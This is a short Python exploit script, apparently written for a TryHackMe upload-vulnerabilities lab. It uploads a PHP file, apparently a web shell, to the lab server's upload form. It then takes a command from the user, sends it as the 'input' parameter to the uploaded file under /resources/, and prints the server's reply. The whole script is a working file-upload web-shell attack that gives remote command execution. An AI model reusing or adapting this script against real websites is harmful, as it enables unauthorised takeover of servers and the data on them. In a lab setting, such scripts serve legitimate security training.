import requests
from requests.models import Response

url = "http://shell.uploadvulns.thm"
endpoint="/resources/"
file = {'fileToUpload': open('file1.php', 'rb')}
response = requests.request("POST", url, files=file, data={})
#print(response.text)

if response.ok:
    print("Upload Completed")
    res_url = url + endpoint
    req2 = requests.get(res_url)
#    print("="*100 + "response of req2" + "="*100)
#    print(req2.text)
else:
    print("Something went wrong!")

cmd = input("enter the command that you want to execute: ")
url1 = "http://shell.uploadvulns.thm/resources/file1.php?input=" + cmd
print("The complete URL is : " + url1)
res1 = requests.request("GET", url1)
print(res1.text)